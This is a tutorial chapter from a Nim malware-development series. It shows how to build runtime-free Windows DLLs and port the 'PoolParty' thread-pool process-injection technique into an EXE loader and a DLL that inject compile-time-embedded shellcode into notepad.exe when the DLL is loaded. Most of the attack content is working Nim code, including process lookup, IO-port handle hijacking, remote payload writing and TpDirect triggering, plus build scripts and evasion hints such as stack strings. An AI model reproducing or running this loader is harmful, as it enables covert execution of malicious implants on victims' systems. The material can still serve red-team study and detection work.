# 0x12 - nimless DLL

This example is quite large, but of interest there are 3 examples in nimless.

```
1. sample_basic_nim_dll.nim -> A simple DLL that pops a message box
2. nimpool_exe_example.nim  -> A loader that triggers threadpool injection via IoInject->TpDirect; shellcode is read in from the current directory at compile time.
3. dll_main.nim             -> A DLL that triggers threadpooll injection via IoInject->TpDirect when it is attached to a process.
4. reflective_loader.nim    -> A reflective loader that will inject our DLL file into a target process.
```

### Creating a Simple DLL

In all previous examples, only PE executables have been used. It is possible to write nimless DLL files in a similar way that we use to create PE executables, but with a little more manual work. First off we can try to create a simple DLL in nim and compile it with out nimless `nim.cfg`. We use an instance to handle functions the same way we did for `0x11 - simple_instance`.

```nim
# initial `main.nim`
import winim/lean

import utils/[stackstr]
import instance 

proc messageBoxTest() {.exportc: "msgBoxTest", dynlib.} = 
  var 
    s1 {.stackStringA.} = "Here is a test"
    s2 {.stackStringA.} = "Here is also a test"
  discard ninst.Win32.MessageBoxA(cast[HWND](0), cast[LPCSTR](s1[0].addr), cast[LPCSTR](s2[0].addr), MB_OK.UINT)


proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReason: LPVOID): BOOL {.stdcall, exportc:"DLLMain", dynlib.} =
  discard ninst.init()

  if fdwReason == DLL_PROCESS_ATTACH:
    messageBoxTest()
  return true
```

When this is compiled, you'll see a hidious error log mentioning undefined reference to `__imp___acrt_iob_func`, `fwrite`, `fflush`, ... ect. How we go about this is do redefine these functions to do nothing, this is done in `undefined_ref.nim`. We use the `exportc` pragma to tell the compiler and the linker that the function exists in this file, and future object. These are functions that we won't be using or if we are using, we would define ourselves.

```nim
# `undefined_ref.nim`
proc nothing1*() {.exportc: "__imp___acrt_iob_func".} = discard
proc nothing2*() {.exportc: "fwrite".} = discard
proc nothing3*() {.exportc: "fflush".} = discard
proc nothing4*() {.exportc: "exit".} = discard
proc nothing5*() {.exportc: "__imp_VirtualAlloc".} = discard
proc nothing6*() {.exportc: "_setjmp".} = discard
proc nothing7*() {.exportc: "signal".} = discard
proc nothing8*() {.exportc: "__imp__fileno".} = discard
proc nothing9*() {.exportc: "__imp__setmode".} = discard
proc nothing10*() {.exportc: "__imp_longjmp".} = discard
```

Next we have a few additions to our `nim.cfg`.

```
## Define DLL
--app=lib

## Linker flags
## Tell to link to DLLMain
--l:"-Wl,-eDLLMain"

# If we need to define a relocation table, we can enable this flag
## Allow relocation table
#--l:"-Wl,--dynamicbase"
```

We can compile it as it and see that it is `44kb` in size. The reason for this is that `NimMain` function is still included in the resulting DLL. 

```
PS C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL> nim c .\main.nim
Hint: used config file 'C:\Users\user\.choosenim\toolchains\nim-2.0.4\config\nim.cfg' [Conf]
Hint: used config file 'C:\Users\user\.choosenim\toolchains\nim-2.0.4\config\config.nims' [Conf]
Hint: used config file 'C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL\nim.cfg' [Conf]
............................................
C:\Users\user\.choosenim\toolchains\nim-2.0.4\lib\system\mm\none.nim(3, 12) Warning: nogc in a library context may not work [User]
...................................................................................................................
C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL\main.nim(4, 19) Warning: imported and not used: 'undefined_ref' [UnusedImport]
CC: undefined_ref.nim
Hint:  [Link]
Hint: mm: none; opt: none (DEBUG BUILD, `-d:release` generates faster code); options: -d:danger
160348 lines; 3.187s; 319.727MiB peakmem; proj: C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL\main.nim; out: C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL\main.dll [SuccessX]
PS C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL> dir main.dll


    Directory: C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/19/2024   7:41 PM          44257 main.dll
```

The linker is responsible for garbage collecting functions that are not referenced, but the problem here is that `NimMain` calls `PreMain` and `PreMainInner` which in turn are referenced by other functions. A manual way of resolving this to make our binary smaller is by removing the function from the generated C code. If you call `nim c --genscript .\main.nim`, this will generate a `compile_main.bat` in the `cache\main` directory. We can edit `@mmain.nim.c` to delete `PreMainInner`, `PreMain`, `NimMainInner`, `NimMain`, and `NimMainModule`. 


```nim
PS C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL\cache\main> .\compile_main.bat

<snip -> compile and link output > 

PS C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL\cache\main> dir .\main.dll


    Directory: C:\Users\user\Desktop\writing_nimless\src\0x12 - nimless_DLL\cache\main


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/19/2024   7:53 PM           5120 main.dll
```

Later we can see how this can be automated..

### Thread pool injection example (exe loader)

Porting over the [Nim PoolParty](https://github.com/m4ul3r/malware/tree/main/nim/thread_pool_injection) is relatively straight forward. 

1. Remove any uses of echo; we can replace this with PRINTA if we desire.
2. Change uses of the WinAPI to our instance; ex: `:%s/<WinApiFunctionName>/ninst.Win32.WinApiFunctionName/g`
3. Any use of the standard library will need to be redefined. This is done in `utils/stdlib/stringh.nim`. An example of this is `wcslen`:
4. Changing all string definitions to `stackStringA` and `stackStringW` pragmas, then passing in the pointer of those to functions.

```nim
# utils/stdlib/string.h
proc wcslen*(s: pointer): int =
  var str2 = cast[ptr uint16](s)
  while (str2[] != 0):
    str2 = cast[ptr uint16](cast[int](str2) + sizeof(uint16))
  return (cast[int](str2) - cast[int](s)) div sizeof(uint16)
```

We port over the `writePayloadIntoProcess` from that repo with the same methodology. There is another snippet outside of that repo that is included and is worth talking about; this is `getProcessIdViaNtQueryFunc`. This procedure takes in a `pointer` to a process name, a `pointer` to a `DWORD` to store the processId to, and a `pointer` to a `HANDLE` to return a handle to the open process.

In the `while true` loop of this funciton, it is comparing the array of `SYSTEM_PROCESS_INFORMATION` values returned from a `NtQuerySystemInformation` call. The first element of the `UNICODE_STRING` portion of the structure is `0` (`instance.ImageName.Buffer`, the `UNICODE_STRING` object). We write a custom `cmpStrAToStrW` to compare our passed in `cstring` to the target wide string. Since the first element of the array has a pointer to `0`, we need to check if the `Buffer` is pointer to something that we can actually dereference.

```nim
proc getProcessIdViaNtQueryFunc(szProcessName: pointer, pdwProcessId: var DWORD, phProcess: ptr HANDLE = cast[ptr HANDLE](0)): bool =
  var 
    uArrayLength: ULONG
    status: NTSTATUS
    pValueToFree: PVOID
    hProcess: HANDLE
# < SNIP >

  while true:
    var instance = cast[PSYSTEM_PROCESS_INFORMATION](systemProcInfo)
    # The first Entry of PSYSTEM_PROCESS_INFORMATION will always be null, we need to handle it.
    if (cast[int](instance.ImageName.Buffer) != 0) and (cmpStrAToStrW(szProcessName, instance.ImageName.Buffer) == 0):
      pdwProcessId = cast[DWORD](instance.UniqueProcessId)

# < SNIP >
  if pdwProcessId == 0:
    return false
  return true
```

We include out shellcode by slurping (`staticRead`) at compile time. This could alternatively be done by downloading the payload remotely, as shown in `0x06 - self_injection_loader`. This payload in not obufscated, but obfuscation can easily be implemented.
```nim
# Read in shellcode at compile time
const 
  buf   = staticRead("demon.sc").cstring
  szBuf = 103935 
```

From here we can chain these procedures together to trigger our shellcode.

```nim
proc doPoolPartyVar1(pBuf: pointer, szBuf: int): bool =
  ## pBuf -> `pointer` to our shellcode
  ## szBuf -> The size of our shellcode
  var 
    target {.stackStringA.} = "notepad.exe"   # Inject into notepad.exe
    pid: DWORD
    hProc: HANDLE
    rPayload: PVOID
  # Look for our running process and retrieve a handle to it
  if getProcessIdViaNtQueryFunc(target[0].addr, pid, hProc.addr):
    PRINTA("[+] Opened Handle [%i] to PID [%i]\n", cast[int](hProc), cast[int](pid))
  else:
    PRINTA("[-] Failed to Open Handle [%i] to PID [%i]\n", cast[int](hProc), cast[int](pid))

  # Get our Hijack Handle
  let hHiJack = hijackProcessIoPort(hProc)
  PRINTA("[+] HijackedHandle [%i]\n", cast[int](hHiJack))

  if writePayloadIntoProcess(hProc, pBuf, szBuf, rPayload.addr):
    PRINTA("[+] Payload Successfully written to %p\n", rPayload)
    discard ninst.Win32.MessageBoxA(cast[HWND](0), NULL, NULL, MB_OK)

  # Do injection
  return injectViaTpDirect(hProc, rPayload, hHiJack)
```

### Thread pool injection (DLL Example)

As mentioned with how the changes were made to include `Nim PoolParty` into our EXE Loader; we can copy and paste these functions into a Dll version, using our specific DLL `nim.cfg` file to compile it. The DLL will be compiled using the `--genscript` method earlier.

```nim
proc injectViaThreadpool() = 
  var pBuf = buf

  discard doPoolPartyTpDirect(pBuf, szBuf)


proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReason: LPVOID): BOOL {.stdcall, exportc:"DLLMain", dynlib.} =
  discard ninst.init()

  if fdwReason == DLL_PROCESS_ATTACH:
    injectViaThreadpool()
  return true
```

A simple quick test for this can be done with `rundll32.exe ./dll_main.dll,test`; the test function does not exist, but it will trigger since the DLL is being loaded. To automate the building of the DLL, we can tell ChatGPt to do it for us and we get this:

```bat
nim c --genscript .\dll_main.nim

cd .\cache\dll_main

set inputFile="@mdll_main.nim.c"
set tempFile=%inputFile%.tmp

powershell -Command ^
    "$inputFile = '%inputFile%';" ^
    "$tempFile = '%tempFile%';" ^
    "$pattern = 'N_LIB_PRIVATE void PreMainInner(void) {';" ^
    "$found = $false;" ^
    "Get-Content -Path $inputFile | ForEach-Object { if (-not $found) { if ($_ -match [regex]::Escape($pattern)) { $found = $true } else { $_ } } } | Set-Content -Path $tempFile;" ^
    "Remove-Item -Path $inputFile;" ^
    "Rename-Item -Path $tempFile -NewName $inputFile;"

REM Check if the process was successful
if exist "%inputFile%" (
    echo File has been processed successfully.
) else (
    echo There was an error processing the file.
)

call compile_dll_main.bat
cd ..\..

move .\cache\dll_main\dll_main.dll .\dll_main.dll
```


### Notes

If there is a variable in the data section named something like `Dl_1543506853_` (ie when looking at the disassembly), this means the program is trying to call a WinAPI function directly (using winim). This would have relied on the Nim runtime to retrieve the address of that function; reminder that the operator must do that.  